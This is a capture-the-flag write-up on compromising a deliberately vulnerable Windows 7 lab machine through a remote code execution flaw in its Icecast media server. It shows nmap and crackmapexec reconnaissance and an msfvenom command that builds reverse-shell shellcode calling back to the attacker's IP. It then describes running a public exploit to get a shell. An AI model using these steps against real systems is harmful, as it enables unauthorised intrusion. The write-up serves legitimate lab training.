Ice


Target IP: 10.10.36.141
Challenge Description: Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

Reconnaissance


I wish to complete this CTF without the use of Metasploit. Performing a port scan using the command sudo nmap -sS 10.10.36.141 -p- -Pn returns the result above. Time to scan these TCP ports further.


Since the SMB is open on the target machine, I used the command crackmapexec smb 10.10.36.141 to identify the OS. The target machine is running Windows 7 Professional SP1 x64. Is this target machine vulnerable to MS17-010? The hostname is also Dark-PC.

Performing an aggressive port scan against the open TCP ports & the OS returns the useful information above. There are HTTP applications running on ports 5357 and 8000 according to the scan above. The HTTP application on port 8000 sounds interesting as the application name Icecast streaming media server is returned. Also, the nmap scan successfully identified the target machine is vulnerable to the MS17-010 exploit. This is an exploitation vector that I can use after enumeration. But now it is time to enumerate the different applications on the target machine.

Enumeration

Port 8000: HTTP

Browsing to the HTTP application on port 8000 returns the webpage above. Even viewing the source-code of the webpage did not yield into anything useful. But from the reconnaissance, I know the target machine is running the application Icecast streaming media server on this port. Time to dig further.


Searching online for icecast exploits returns the verified exploit above. Is this version 2.0.1 being used by the target machine? According to the exploit above, this application version is vulnerable to RCE. Time to test it against the target machine.


I downloaded a copy of the C exploit from the previous image on my machine, as shown above. It looks like the reverse shell spawns on port 9999 at localhost. I will need to compile this exploit.

Exploitation


I tried compiling and running the original exploit against the target machine, but I had no luck. The original exploit does not contain the steps for the shellcode generation either which makes it complicated. Luckily, I found the Github repository shown above which contains the exploit for this application.


The same repository contains the exploit written in Python, as shown above. This exploit contains the steps on how to use it, and the shellcode generation command. I downloaded a copy of the exploit on my machine.


Using the command msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.14.55.153 LPORT=8443 -f python -b '\x00\x0a\x0d', I generated the shellcode. Then I replaced the original shellcode with my generated shellcode in the exploit, as shown above. I had to reset the box as the target machine was being unstable. After resetting it, the target machine now has the IP address of 10.10.118.141.


After making changes to the exploit, I started a listener on my machine at port 8443. Then using the command python3 exp.py 10.10.118.141 8000, I launched the exploit against the target machine. I obtained a reverse shell connection from the target machine with the session as dark on my machine at port 8443, as shown above on the bottom terminal. Now I have a foothold on the target machine. Performing a privilege escalation is doable. I will update this writeup once I find a vector for PE.
